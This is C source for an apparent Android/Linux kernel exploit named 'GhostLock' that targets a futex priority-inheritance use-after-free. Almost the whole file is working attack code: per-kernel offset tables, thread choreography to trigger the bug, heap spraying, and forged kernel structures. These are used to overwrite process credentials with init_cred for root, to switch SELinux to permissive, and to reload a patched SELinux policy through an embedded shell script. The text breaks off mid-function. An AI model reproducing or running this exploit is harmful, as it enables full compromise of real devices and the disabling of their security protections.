/*
 * GhostLock — CVE-2026-43499 futex PI UAF exploit
 *
 * Phase 1: Write 1 — SELinux permissive (child-node PI write)
 * Phase 2: Write 2 — cred = init_cred (child-node PI write via perf task leak)
 */

#include "common.h"
#include "offsets.h"
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <linux/perf_event.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/utsname.h>

const struct kernel_offsets *active_offsets = NULL;

/* Override target.h _OFF macros with dynamic offsets from offsets.h table */
#undef SELINUX_ENFORCING_OFF
#undef INIT_CRED_OFF
#undef INIT_TASK_OFF
#undef INIT_UTS_NS_OFF
#undef EMPTY_ZERO_PAGE_OFF
#undef ROOT_TASK_GROUP_OFF
#undef KPTR_RESTRICT_OFF
#undef SELINUX_BLOB_SIZES_OFF
#undef SECURITY_HOOK_HEADS_OFF
#undef KMALLOC_CACHES_OFF
#undef ANON_PIPE_BUF_OPS_OFF
#undef ASHMEM_MISC_FOPS_OFF
#undef ASHMEM_FOPS_OFF
#undef ASHMEM_IOCTL_OFF
#undef ASHMEM_COMPAT_IOCTL_OFF
#undef ASHMEM_MMAP_OFF
#undef ASHMEM_OPEN_OFF
#undef ASHMEM_RELEASE_OFF
#undef ASHMEM_SHOW_FDINFO_OFF
#undef CONFIGFS_READ_ITER_OFF
#undef CONFIGFS_BIN_WRITE_ITER_OFF
#undef COPY_SPLICE_READ_OFF
#undef NOOP_LLSEEK_OFF
#undef CAP_CAPABLE_ACTIVE_OFF
#undef SLIDE_NFULNL_LOGGER_OFF
#undef SLIDE_LOGGERS_0_1_OFF
#undef SLIDE_RANDOM_BOOT_ID_DATA_OFF
#undef SLIDE_SYSCTL_BOOTID_OFF

#define SELINUX_ENFORCING_OFF         active_offsets->off_selinux_enforcing
#define INIT_CRED_OFF                 active_offsets->off_init_cred
#define INIT_TASK_OFF                 active_offsets->off_init_task
#define INIT_UTS_NS_OFF               active_offsets->off_init_uts_ns
#define EMPTY_ZERO_PAGE_OFF           active_offsets->off_empty_zero_page
#define ROOT_TASK_GROUP_OFF           active_offsets->off_root_task_group
#define KPTR_RESTRICT_OFF             active_offsets->off_kptr_restrict
#define SELINUX_BLOB_SIZES_OFF        active_offsets->off_selinux_blob_sizes
#define SECURITY_HOOK_HEADS_OFF       active_offsets->off_security_hook_heads
#define KMALLOC_CACHES_OFF            active_offsets->off_kmalloc_caches
#define ANON_PIPE_BUF_OPS_OFF         active_offsets->off_anon_pipe_buf_ops
#define ASHMEM_MISC_FOPS_OFF          active_offsets->off_ashmem_misc_fops
#define ASHMEM_FOPS_OFF               active_offsets->off_ashmem_fops
#define ASHMEM_IOCTL_OFF              active_offsets->off_ashmem_ioctl
#define ASHMEM_COMPAT_IOCTL_OFF       active_offsets->off_ashmem_compat_ioctl
#define ASHMEM_MMAP_OFF               active_offsets->off_ashmem_mmap
#define ASHMEM_OPEN_OFF               active_offsets->off_ashmem_open
#define ASHMEM_RELEASE_OFF            active_offsets->off_ashmem_release
#define ASHMEM_SHOW_FDINFO_OFF        active_offsets->off_ashmem_show_fdinfo
#define CONFIGFS_READ_ITER_OFF        active_offsets->off_configfs_read_iter
#define CONFIGFS_BIN_WRITE_ITER_OFF   active_offsets->off_configfs_bin_write_iter
#define COPY_SPLICE_READ_OFF          active_offsets->off_copy_splice_read
#define NOOP_LLSEEK_OFF               active_offsets->off_noop_llseek
#define CAP_CAPABLE_ACTIVE_OFF        active_offsets->off_cap_capable_active
#define SLIDE_NFULNL_LOGGER_OFF       active_offsets->off_slide_nfulnl_logger
#define SLIDE_LOGGERS_0_1_OFF         active_offsets->off_slide_loggers_0_1
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF active_offsets->off_slide_boot_id
#define SLIDE_SYSCTL_BOOTID_OFF       active_offsets->off_slide_boot_id

/* Override struct field offsets (task_struct, etc.) with per-device values */
#include "runtime_struct_offsets.h"

static int select_offsets(void) {
  struct utsname uts;
  if (uname(&uts) < 0) return -1;
  pr_info("kernel: %s\n", uts.release);
  for (int i = 0; known_offsets[i].uname_r; i++) {
    if (strcmp(uts.release, known_offsets[i].uname_r) == 0) {
      active_offsets = &known_offsets[i];
      pr_success("offsets matched: %s\n", active_offsets->uname_r);
      /* Publish per-device symbol addresses that other TUs need. INIT_CRED
       * here expands via the redefined INIT_CRED_OFF above, i.e. the runtime
       * table entry rather than target.h's compile-time constant. */
      g_init_cred_image = INIT_CRED;
      if (active_offsets->kernel_phys_load) {
        p0_kernel_phys_load = active_offsets->kernel_phys_load;
      }
      /* phys_offset=0 is valid (Amlogic S905X3 has RAM at phys 0) */
      if (active_offsets->phys_offset || active_offsets->kernel_phys_load < 0x10000000) {
        p0_phys_offset = active_offsets->phys_offset;
      }
      pr_info("init_cred image=%016zx alias=%016zx\n",
              (size_t)g_init_cred_image, (size_t)data_addr(g_init_cred_image));
      return 0;
    }
  }
  pr_error("no offsets for kernel: %s\n", uts.release);
  pr_error("add this kernel to offsets.h and rebuild\n");
  return -1;
}

static struct timespec t0;
static void timer_reset(void) { clock_gettime(CLOCK_MONOTONIC, &t0); }
static double timer_ms(void) {
  struct timespec now;
  clock_gettime(CLOCK_MONOTONIC, &now);
  return (now.tv_sec - t0.tv_sec) * 1000.0 + (now.tv_nsec - t0.tv_nsec) / 1e6;
}
#define TIMER(label) pr_info("[T+%.0fms] %s\n", timer_ms(), label)

extern int pselect_custom_write;
extern uintptr_t pselect_custom_target;
extern uintptr_t pselect_custom_value;
extern int pselect_child_node;
void set_pselect_write_mode(uintptr_t target, uintptr_t value, int mode);
void clear_pselect_write(void);

uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int owner_started;
atomic_int owner_chain_done;
atomic_int route_done;
atomic_int waiter_tid;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int main_route_delay_usec;
atomic_int pipe_prepare_request;
atomic_int pipe_prepare_done;
atomic_int ghost_bug_armed;
atomic_int route_in_handler;
atomic_int waiter_futex_returned;
atomic_int consumer_walks_done;
atomic_int consumer_erase_hits;
int g_consumer_nice = 0;
int memfd_leak;

int consumer_nice_headroom(void) {
  return g_consumer_nice < 19;
}

void *waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  /* The overlay-route signal is thread-directed at this thread; make sure
   * it is deliverable here regardless of the creating thread's mask. */
  {
    sigset_t set;
    sigemptyset(&set);
    sigaddset(&set, SIGUSR1);
    pthread_sigmask(SIG_UNBLOCK, &set, NULL);
  }
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid, tid);
  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
    pr_error("waiter lock chain errno=%d\n", errno);
  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) usleep(1000);
  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += ROUTE_WAIT_SECONDS;
  atomic_store(&waiter_waiting, 1);
  {
    errno = 0;
    long wr = futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
    int we = errno;
    atomic_store(&waiter_futex_returned, 1);
    printf("[TRIG] waiter WAIT_REQUEUE_PI ret=%ld errno=%d (EDEADLK=%d means bug armed)\n",
           wr, we, wr == -EDEADLK);
  }
  /* Walk-before-cleanup: if the SIGUSR1 handler ran while this futex was
   * interrupted (-ERESTARTNOINTR), the overlay + the consumer's PI walks
   * already happened on this thread's kernel stack, and reaching this
   * point means the restarted futex has already run its ETIMEDOUT
   * cleanup path over the QUIESCED spray page. Only run the route inline
   * in the legacy flow (GHOST_SIGNAL_ROUTE=0, or the signal never came). */
  if (!atomic_load(&route_in_handler))
    do_pselect_fake_lock_route();
  atomic_store(&route_done, 1);
  /* skip UNLOCK_PI on f_pi_chain in cred mode -- the PI state is corrupted
   * and touching it can crash. The owner thread will hang but we don't care. */
  if (pselect_custom_write != 6)
    futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  if (pselect_custom_write != 6)
    while (!atomic_load(&owner_chain_done)) usleep(1000);
  return NULL;
}

void *owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  if (lock_target != 0) pr_error("owner lock target errno=%d\n", errno);
  while (!atomic_load(&waiter_ready)) usleep(1000);
  atomic_store(&owner_started, 1);
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&owner_chain_done, 1);
  for (;;) sleep(1);
}

static uintptr_t perf_leak_own_task(void);
uintptr_t g_consumer_task = 0;
void *consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);
  /* Consumer perf leak disabled -- causes reclaim failures. */
  int seen = 0;
  while (!atomic_load(&punch_consume_stop)) {
    int seq = atomic_load(&punch_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }
    seen = seq;
    int tid = atomic_load(&waiter_tid);
    /* Same-page overlay retry (walk-before-cleanup flow): when a previous
     * round quenched the page after landing erase(s), re-arm W0 + the lock
     * tree + fake_task->pi_waiters from the PENDING plan before this
     * round's first walk. The quiesce zeroes the tree roots (they point at
     * the previous overlay's kernel-stack waiter, which is dead data once
     * that sendmsg unwound) and clears W0.pi_tree.rb_right (the write
     * VALUE), so without this re-arm the next walk would hit a NULL
     * prerequeue_top_waiter -> NULL-deref in rt_mutex_dequeue_pi. */
    if (seq >= 2 && pselect_custom_write == 6 &&
        atomic_load(&consumer_erase_hits) >= 1 &&
        atomic_load(&consumer_erase_hits) < ghost_plan_count()) {
      ghost_apply_next_plan(atomic_load(&consumer_erase_hits) - 1);
    }
    int calls_this_seq = 0;
    while (!atomic_load(&punch_consume_stop) &&
           atomic_load(&punch_consume_go) == seq) {
      int delay_usec = atomic_load(&main_route_delay_usec);
      if (delay_usec > 0) usleep((useconds_t)delay_usec);
      for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
        if (atomic_load(&punch_consume_stop) ||
            atomic_load(&punch_consume_go) != seq) break;
        atomic_fetch_add(&consumer_calls, 1);
        /* Retarget walk 0 to consumer's real_cred if we have our task */
        if (calls_this_seq == 0 && pselect_custom_write == 6 && g_consumer_task) {
          uintptr_t cpc = (g_consumer_task + TASK15_REAL_CRED_OFF - 8) | 1;
          for (int m2 = 0; m2 < uring_count; m2++) {
            uint8_t *pg2 = (uint8_t *)uring_maps[m2];
            put64(pg2, W0_OFF + 0x18, cpc);
          }
          char m3[96];
          int n3 = snprintf(m3, sizeof(m3), "[RETARGET] walk 0 -> consumer real_cred %016lx\n",
                            (unsigned long)(g_consumer_task + TASK15_REAL_CRED_OFF));
          write(1, m3, n3);
        }
        {
          char m[64];
          int n = snprintf(m, sizeof(m), "[FIRE %d] tid=%d\n", calls_this_seq, tid);
          if (write(1, m, n) < 0) { /* ignore */ }
        }
        errno = 0;
        struct timespec t0, t1;
        clock_gettime(CLOCK_MONOTONIC, &t0);
        /* Monotonic nice ladder across ALL overlay rounds: each call must
         * be a real priority change, else __sched_setscheduler exits early
         * without walking (GATE A), and a decrease would be EPERM (GATE B)
         * and divert to the uncontrolled FUTEX_LOCK_PI fallback walk. */
        int nice = g_consumer_nice + 7;
        if (nice > 19) nice = 19;
        g_consumer_nice = nice;
        {
          int pre_nice = getpriority(PRIO_PROCESS, tid);
          char m[128];
          int n = snprintf(m, sizeof(m), "[NICE] walk %d: %d -> %d\n",
                           calls_this_seq, pre_nice, nice);
          write(1, m, n);
        }
        long sched_ret = sched_setattr_tid(tid, nice);
        /* Check ALL uring maps for walk modification */
        if (pselect_custom_write == 6) {
          int found = -1;
          uint64_t expected_armed = *(volatile uint64_t *)((uint8_t *)uring_sqes + W0_OFF + 0x18);
          for (int mi = 0; mi < uring_count; mi++) {
            uint64_t pc_i = *(volatile uint64_t *)((uint8_t *)uring_maps[mi] + W0_OFF + 0x18);
            if (pc_i != expected_armed) { found = mi; break; }
          }
          char mc[128];
          int nc2;
          if (found >= 0) {
            uint64_t pc_f = *(volatile uint64_t *)((uint8_t *)uring_maps[found] + W0_OFF + 0x18);
            nc2 = snprintf(mc, sizeof(mc), "[WALKCHK %d] FOUND on map %d/%d pc=%016llx\n",
                           calls_this_seq, found, uring_count, (unsigned long long)pc_f);
            /* Erase-hit oracle: the walk's rb_erase wrote the
             * __rb_clear_node marker (&victim) into W0.pi_tree.pc on the
             * mapping that backs the leaked mm page. Only count a hit when
             * the pre-walk state was the armed plan (not already the
             * marker), so no-op calls can not double-count. */
            if (pc_f == (uint64_t)(page_base + W0_OFF + 0x18) &&
                expected_armed != (uint64_t)(page_base + W0_OFF + 0x18)) {
              int hits = atomic_fetch_add(&consumer_erase_hits, 1) + 1;
              char hm[96];
              int hn = snprintf(hm, sizeof(hm), "[ERASE %d] rb_erase write landed (hits=%d/%d)\n",
                                calls_this_seq, hits, ghost_plan_count());
              write(1, hm, hn);
            }
          } else {
            nc2 = snprintf(mc, sizeof(mc), "[WALKCHK %d] NOT FOUND in %d maps (all=%016llx)\n",
                           calls_this_seq, uring_count, (unsigned long long)expected_armed);
          }
          write(1, mc, nc2);
        }
        clock_gettime(CLOCK_MONOTONIC, &t1);
        long dur_ns = (t1.tv_sec - t0.tv_sec) * 1000000000L + (t1.tv_nsec - t0.tv_nsec);
        {
          char m[96];
          int n = snprintf(m, sizeof(m), "[RET %d] sched_ret=%ld errno=%d dur=%ldus\n",
                          calls_this_seq, sched_ret, errno, dur_ns / 1000);
          if (write(1, m, n) < 0) { /* ignore */ }
        }
        if (sched_ret != 0) {
          struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
          long fret = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, &ft, NULL, 0);
          {
            char m[96];
            int n = snprintf(m, sizeof(m), "[FB %d] fret=%ld\n", calls_this_seq, fret);
            if (write(1, m, n) < 0) { /* ignore */ }
          }
          if (fret == 0) {
            futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
            sched_ret = 0;
          }
        }
        if (sched_ret == 0) atomic_fetch_add(&consumer_success, 1);
        /* Each sched_setattr (or its futex fallback) ran one synchronous
         * ghost chain walk. Queue the next write into W0.pi_tree_entry
         * through the SQE mmap for the following walk (if any). */
        ghost_apply_next_plan(calls_this_seq);
        /* Dump map 64's W0 state after re-arm */
        if (pselect_custom_write == 6 && calls_this_seq == 0 && uring_count > 64) {
          uint8_t *m64 = (uint8_t *)uring_maps[64];
          uint32_t w0_prio = *(uint32_t *)(m64 + W0_OFF + 0x44);
          uint64_t w0_pc = *(uint64_t *)(m64 + W0_OFF + 0x18);
          uint64_t lk_root = *(uint64_t *)(m64 + LOCK_OFF + 0x08);
          uint64_t lk_left = *(uint64_t *)(m64 + LOCK_OFF + 0x10);
          uint64_t pi_root = *(uint64_t *)(m64 + FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF);
          char dm[192];
          int dn = snprintf(dm, sizeof(dm),
            "[REARM64] W0.prio=%u pc=%016llx lk.root=%016llx lk.left=%016llx pi.root=%016llx\n",
            w0_prio, (unsigned long long)w0_pc,
            (unsigned long long)lk_root, (unsigned long long)lk_left,
            (unsigned long long)pi_root);
          write(1, dm, dn);
        }
        calls_this_seq++;
        if (calls_this_seq >= ghost_plan_count()) {
          atomic_store(&punch_consume_go, 0);
          /* Quiesce the spray page before the waiter's futex return path
           * walks it while holding hb->lock. Clear all tree roots, lock
           * fields, and owner so cleanup_proxy_lock sees empty trees. */
          if (pselect_custom_write == 6) {
            /* Full quiesce: release spinlocks, clear trees, repair uid.
             * The waiter thread spins on page spinlock words (wait_lock
             * and/or pi_lock) held by the walk. Zero them to release. */
            for (int m = 0; m < uring_count; m++) {
              uint8_t *pg = (uint8_t *)uring_maps[m];
              /* Release spinlocks FIRST (breaks the spin) */
              *(volatile uint32_t *)(pg + LOCK_OFF) = 0;                    /* wait_lock */
              *(volatile uint32_t *)(pg + FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF) = 0; /* pi_lock */
              /* NULL W0 children */
              *(volatile uint64_t *)(pg + W0_OFF + 0x08) = 0;
              *(volatile uint64_t *)(pg + W0_OFF + 0x10) = 0;
              *(volatile uint64_t *)(pg + W0_OFF + 0x20) = 0;
              *(volatile uint64_t *)(pg + W0_OFF + 0x28) = 0;
              /* Clean tree roots + owner */
              *(volatile uint64_t *)(pg + LOCK_OFF + 0x08) = 0;
              *(volatile uint64_t *)(pg + LOCK_OFF + 0x10) = 0;
              *(volatile uint64_t *)(pg + LOCK_OFF + 0x18) = 0;
              *(volatile uint64_t *)(pg + FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF) = 0;
              *(volatile uint64_t *)(pg + FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 8) = 0;
              /* Repair uid/gid */
              *(volatile uint32_t *)(pg + FAKE_CRED_OFF + CRED15_UID_OFF) = 0;
              *(volatile uint32_t *)(pg + FAKE_CRED_OFF + CRED15_GID_OFF) = 0;
            }
            __atomic_thread_fence(__ATOMIC_SEQ_CST);
            *(volatile uint32_t *)&f_pi_target = 0;
            *(volatile uint32_t *)&f_pi_chain = 0;
            *(volatile uint32_t *)&f_wait = 0;
            __atomic_thread_fence(__ATOMIC_SEQ_CST);
            /* Write main thread's procfs uid to file and exit immediately.
             * Don't wait -- the main thread is stuck from CPU saturation. */
            {
              char sp[64], sb[512], ob[256];
              pid_t mp = getpid();
              snprintf(sp, sizeof(sp), "/proc/%d/task/%d/status", mp, mp);
              int sf = open(sp, O_RDONLY);
              if (sf >= 0) {
                int n = read(sf, sb, sizeof(sb)-1);
                close(sf);
                if (n > 0) {
                  sb[n] = 0;
                  char *u = strstr(sb, "Uid:");
                  if (u) { char *nl = strchr(u, '\n'); if (nl) *nl = 0; }
                  int ol2 = snprintf(ob, sizeof(ob), "[+] main: %s\n", u ? u : "?");
                  write(1, ob, ol2);
                  int mf = open("/data/local/tmp/.ghostlock_root",
                                O_WRONLY|O_CREAT|O_TRUNC|O_SYNC, 0644);
                  if (mf >= 0) { write(mf, ob, ol2); fsync(mf); close(mf); }
                }
              }
            }
            /* Publish completion only when this route can contribute
             * nothing more: every planned erase landed, or the nice ladder
             * is exhausted (no further sched_setattr can produce a real
             * priority change -> no further walk can ever fire). If erases
             * are still pending, stay alive: the route's next overlay
             * round (a fresh sendmsg re-writes waiter->prio=CAL_PRIO, and
             * the monotonic ladder supplies the priority change) re-fires
             * the pending plan. The main thread waits for this flag (plus
             * its erase-count bound) before it exec()s, so the exec can
             * never kill the consumer mid-walk. */
            if (atomic_load(&consumer_erase_hits) >= ghost_plan_count() ||
                !consumer_nice_headroom()) {
              atomic_store(&consumer_walks_done, 1);
              /* Stop the consumer for good: no further walks may fire
               * after this point -- the waiter's futex restarts once the
               * handler returns and re-initializes the rt_mutex_waiter
               * that the dangling pi_blocked_on points at. */
              atomic_store(&punch_consume_stop, 1);
            }
            /* Don't exit -- let the main thread handle exec. */
          }
          break;
        }
      }
    }
  }
  return NULL;
}

void reset_main_route_state(void) {
  f_wait = 0; f_pi_target = 0; f_pi_chain = 0;
  atomic_store(&waiter_ready, 0); atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0); atomic_store(&owner_chain_done, 0);
  atomic_store(&route_done, 0); atomic_store(&waiter_tid, 0);
  atomic_store(&punch_consume_go, 0); atomic_store(&punch_consume_stop, 0);
  atomic_store(&consumer_calls, 0); atomic_store(&consumer_success, 0);
  atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
  atomic_store(&pipe_prepare_request, 0); atomic_store(&pipe_prepare_done, 0);
  atomic_store(&ghost_bug_armed, 0);
  atomic_store(&route_in_handler, 0);
  atomic_store(&waiter_futex_returned, 0);
  atomic_store(&consumer_walks_done, 0);
  atomic_store(&consumer_erase_hits, 0);
  g_consumer_nice = 0;
  cfi_last_step = 0; cfi_last_errno = 0;
}

void run_main_route_threads(void) {
  reset_main_route_state();
  /* Install the in-handler overlay route (walk-before-cleanup): the
   * handler runs on whichever thread receives the thread-directed
   * SIGUSR1 (main sends it to the waiter tid right after the CMP_REQUEUE_PI
   * arms the bug). See ghost_usr1_handler() in fops.c. */
  {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = ghost_usr1_handler;
    sigemptyset(&sa.sa_mask);
    sigaddset(&sa.sa_mask, SIGUSR1); /* block re-entry inside the handler */
    sa.sa_flags = SA_RESTART;
    sigaction(SIGUSR1, &sa, NULL);
  }
  pthread_t waiter, owner, consumer;
  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));
  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started))
    usleep(1000);
  usleep(50000);
  errno = 0;
  {
    long rr = futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
    int re = errno;
    printf("[TRIG] main CMP_REQUEUE_PI ret=%ld errno=%d (EDEADLK=%d means cycle hit)\n",
           rr, re, rr == -EDEADLK);
    /* Walk-before-cleanup restructure: with the CVE armed (the EDEADLK
     * rollback in rt_mutex_start_proxy_lock -> remove_waiter cleared
     * CURRENT's pi_blocked_on, not the waiter task's -- so the waiter
     * task's pi_blocked_on now dangles at the rt_mutex_waiter inside its
     * STILL RUNNING FUTEX_WAIT_REQUEUE_PI syscall), signal the waiter.
     *
     * The futex returns -ERESTARTNOINTR (kernel-internal), the SIGUSR1
     * handler runs the SEQPACKET overlay route on the waiter's kernel
     * stack at the exact same syscall-entry depth, the consumer fires the
     * PI chain walks against that overlay while the handler blocks in
     * sendmsg, and only then does the handler return -- the futex
     * restarts, times out immediately against its original absolute
     * deadline, and its ETIMEDOUT cleanup path runs over the QUIESCED
     * spray page (it only takes hb->lock and plist_del's the futex_q;
     * it can never contend a page spinlock). */
    if (ghost_signal_route_enabled() && rr == -1 && re == EDEADLK) {
      atomic_store(&ghost_bug_armed, 1);
      int wtid = atomic_load(&waiter_tid);
      long kr = syscall(SYS_tgkill, getpid(), wtid, SIGUSR1);
      printf("[TRIG] main SIGUSR1 -> waiter tid=%d ret=%ld (overlay route fires in-handler)\n",
             wtid, kr);
    }
  }
  reset_cpu_pin();
  if (pselect_custom_write == 6) {
    uint32_t uid_orig = getuid();
    uint32_t uid_spin = uid_orig;
    /* Poll getuid with NO stdio (write(1) blocks on wedged hb->lock).
     * Accept 0xffffff80 as "swap landed" (uid repair pending). */
    for (int _i = 0; uid_spin == uid_orig && _i < 500000; _i++) {
      __asm__ volatile("yield" ::: "memory");
      uid_spin = syscall(__NR_getuid);
    }
    g_route_write_ok = (uid_spin != uid_orig);
    /* Walk-before-cleanup: when a walk landed (uid changed to 0xffffff80
     * -- the erase wrote the pc's high word into fake_cred.uid -- or to 0
     * after a quiesce repair), wait (bounded) for the consumer to finish
     * ALL planned erases plus the final quiesce before returning:
     * run_cred_swap re-checks getuid() (the quiesce repairs the clobbered
     * uid to 0), and the exec must not kill the consumer mid-walk while
     * it holds the waiter's real pi_lock and the page spinlocks. The
     * consumer signals consumer_walks_done only when every planned erase
     * landed or the nice ladder is exhausted; each overlay-retry round
     * takes up to SO_SNDTIMEO (3 s), so the bound covers several rounds. */
    if (g_route_write_ok) {
      struct timespec wd;
      clock_gettime(CLOCK_MONOTONIC, &wd);
      while (!atomic_load(&consumer_walks_done) &&
             atomic_load(&consumer_erase_hits) < g_write_plan_count) {
        struct timespec wn;
        clock_gettime(CLOCK_MONOTONIC, &wn);
        if (wn.tv_sec - wd.tv_sec >= 12) break;
        __asm__ volatile("yield" ::: "memory");
      }
    }
  } else {
    while (!atomic_load_explicit(&route_done, memory_order_acquire))
      __asm__ volatile("yield" ::: "memory");
  }
}

static int do_one_write(uintptr_t target, const char *desc, int mode) {
  pr_info("=== %s === target=0x%016zx mode=%d\n", desc, target, mode);
  ghost_reset_plans();
  g_route_write_ok = 0;
  pselect_child_node = 1;
  set_pselect_write_mode(target, 0, mode);
  TIMER("  heap spray start");
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
  if (!page_base) { pr_error("  heap spray failed\n"); clear_pselect_write(); return 0; }
  if (mode == 6) {
    /* Walk 0: cred. Plan: walk 1 targets real_cred (= target - 8). */
    ghost_push_plan(pselect_custom_target - 8, page_base + FAKE_CRED_OFF);
    pr_info("  walk0: cred, walk1: real_cred, fake_cred=%016zx plans=%d\n",
            page_base + FAKE_CRED_OFF, ghost_plan_count());
  }
  TIMER("  heap spray done");
  run_main_route_threads();
  clear_pselect_write();
  return 1;
}

static int check_selinux_off(void) {
  int efd = open("/sys/fs/selinux/enforce", O_RDONLY);
  if (efd < 0) return 1;
  char b[4] = {0};
  read(efd, b, sizeof(b));
  close(efd);
  return b[0] == '0';
}

static int write_selinux_policy_fix_script(void) {
  static const char fix_script[] =
    "#!/system/bin/sh\n"
    "P=/sys/fs/selinux/policy\n"
    "L=/sys/fs/selinux/load\n"
    "T=/data/local/tmp/.ghostlock_policy.bin\n"
    "LOG=/data/local/tmp/.ghostlock_policy.log\n"
    "exec >>$LOG 2>&1\n"
    "echo \"[*] policy fix: uid=$(id -u) enforce=$(cat /sys/fs/selinux/enforce 2>/dev/null)\"\n"
    "cp $P $T || { echo '[!] policy fix: policy copy failed'; exit 1; }\n"
    "SZ=$(wc -c < $T)\n"
    "[ \"$SZ\" -gt 20 ] || { echo \"[!] policy fix: policy too short ($SZ bytes)\"; exit 1; }\n"
    "ID_LEN=$(dd if=$T bs=1 skip=4 count=4 2>/dev/null | od -A n -t u4 | tr -d ' ')\n"
    "CO=$((4 + 4 + ID_LEN + 4))\n"
    "CFG=$(dd if=$T bs=1 skip=$CO count=4 2>/dev/null | od -A n -t u4 | tr -d ' ')\n"
    "NEW=$(( CFG | 0xC0000000 ))\n"
    "if [ \"$NEW\" != \"$CFG\" ]; then\n"
    "  printf '\\\\x%02x\\\\x%02x\\\\x%02x\\\\x%02x' "
      "$((NEW & 0xFF)) $(((NEW>>8) & 0xFF)) $(((NEW>>16) & 0xFF)) $(((NEW>>24) & 0xFF))"
      " | dd of=$T bs=1 seek=$CO conv=notrunc 2>/dev/null\n"
    "  echo \"[*] policy fix: config=$CFG -> $NEW at offset=$CO (netlink flags restored)\"\n"
    "else\n"
    "  echo \"[*] policy fix: config=$CFG at offset=$CO (already has netlink flags)\"\n"
    "fi\n"
    "# /sys/fs/selinux/load accepts the complete policy in one write only.\n"
    "if dd if=$T of=$L bs=$SZ count=1; then\n"
    "  echo '[+] policy fix: policy load succeeded'\n"
    "  rm -f $T\n"
    "  exit 0\n"
    "fi\n"
    "echo '[!] policy fix: policy load failed'\n"
    "rm -f $T\n"
    "exit 1\n";
  int sfd = open("/data/local/tmp/.ghostlock_fixpol.sh", O_WRONLY | O_CREAT | O_TRUNC, 0755);
  if (sfd < 0) {
    pr_info("fix_policy: write script failed errno=%d\n", errno);
    return 0;
  }
  ssize_t wrote = write(sfd, fix_script, strlen(fix_script));
  close(sfd);
  if (wrote != (ssize_t)strlen(fix_script)) {
    pr_info("fix_policy: script write failed ret=%zd errno=%d\n", wrote, errno);
    return 0;
  }
  return 1;
}

static int kernelsu_module_loaded(void) {
  int fd = open("/proc/modules", O_RDONLY);
  if (fd < 0) return 0;

  char modules[8192] = {0};
  ssize_t n = read(fd, modules, sizeof(modules) - 1);
  close(fd);
  return n > 0 && strstr(modules, "kernelsu ") != NULL;
}

static int wait_for_ksu_status(void) {
  static const char status_path[] = "/data/local/tmp/.ghostlock_ksu.status";

  for (int attempt = 1; attempt <= 40; attempt++) {
    /* The late-load helper can be replaced or blocked as the module comes
     * online. /proc/modules is observable from this original shell and is
     * therefore the authoritative readiness signal. */
    if (kernelsu_module_loaded()) {
      pr_success("KernelSU module is loaded\n");
      return 0;
    }

    char status[128] = {0};
    int fd = open(status_path, O_RDONLY);
    if (fd >= 0) {
      ssize_t n = read(fd, status, sizeof(status) - 1);
      close(fd);
      if (n > 0) {
        status[strcspn(status, "\r\n")] = '\0';
        if (!strcmp(status, "ready")) {
          pr_success("KernelSU helper reports ready\n");
          return 0;
        }
        if (!strncmp(status, "failed:", 7)) {
          pr_error("KernelSU helper reports %s; see .ghostlock_root.log and .ghostlock_ksud.log\n",
                   status);
          return 1;
        }
      }
    }
    if (attempt == 1 || attempt % 10 == 0) {
      pr_info("waiting for KernelSU helper status (%d/40)\n", attempt);
    }
    sleep(1);
  }

  pr_error("KernelSU helper did not report readiness; see .ghostlock_root.log and .ghostlock_ksud.log\n");
  return 1;
}

static void slab_drain(void) {
  struct timespec up;
  clock_gettime(CLOCK_BOOTTIME, &up);
  int waves = (up.tv_sec > 60) ? 5 : 2;
  int batch = (up.tv_sec > 60) ? 400 : 200;
  for (int wave = 0; wave < waves; wave++) {
    pid_t *drain = calloc(batch, sizeof(pid_t));
    int n = 0;
    for (int i = 0; i < batch; i++) {
      drain[i] = fork();
      if (drain[i] == 0) { pause(); _exit(0); }
      if (drain[i] > 0) n++;
    }
    for (int i = 0; i < n; i++) {
      kill(drain[i], SIGKILL);
      waitpid(drain[i], NULL, 0);
    }
    free(drain);
    sched_yield();
  }
}

static void write_root_script(void) {
